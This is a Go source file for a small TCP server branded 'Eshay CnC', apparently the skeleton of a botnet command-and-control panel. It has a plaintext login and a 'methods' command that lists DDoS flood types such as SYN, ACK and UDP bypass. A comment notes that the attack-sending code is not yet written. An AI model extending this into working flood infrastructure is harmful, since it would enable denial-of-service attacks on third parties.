package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

type Config struct {
	Port  string            `json:"port"`
	Users map[string]string `json:"users"`
}

var config Config

func loadConfig() error {
	configFile, err := os.Open("eshay.json")
	if err != nil {
		return err
	}
	defer configFile.Close()

	jsonParser := json.NewDecoder(configFile)
	if err = jsonParser.Decode(&config); err != nil {
		return err
	}

	return nil
}

func main() {
	err := loadConfig()
	if err != nil {
		fmt.Println("Error decoding config file:", err)
		return
	}

	port := config.Port
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Println("Error starting TCP server:", err)
		return
	}

	fmt.Println("Listening on port", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Prompt for username
	fmt.Fprint(writer, "Username: ")
	writer.Flush()
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)

	// Prompt for password
	fmt.Fprint(writer, "Password: ")
	writer.Flush()
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	if config.Users[username] != password {
		fmt.Fprintln(writer, "Incorrect username or password")
		writer.Flush()
		return
	}

	fmt.Fprintln(writer, "Welcome To Eshay CnC", username)
	writer.Flush()

	prompt := fmt.Sprintf("%s@eshay # ", username)
	for {
		fmt.Fprint(writer, prompt)
		writer.Flush()

		input, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		input = strings.TrimSpace(input)

		switch input {
		case "clear", "cls":
			cmd := exec.Command("clear")
			cmd.Stdout = conn
			cmd.Run()
		case "methods": // i might add the function to send attacks and add to github idk yet
			fmt.Fprintln(writer, ".ack\n.syn\n.stomp\n.tcp-coon\n.socket\n.udpfloood\n.udpbypass")
			writer.Flush()
		default:
			fmt.Fprintf(writer, "Unknown command: %s\n", input)
			writer.Flush()
		}
	}
}
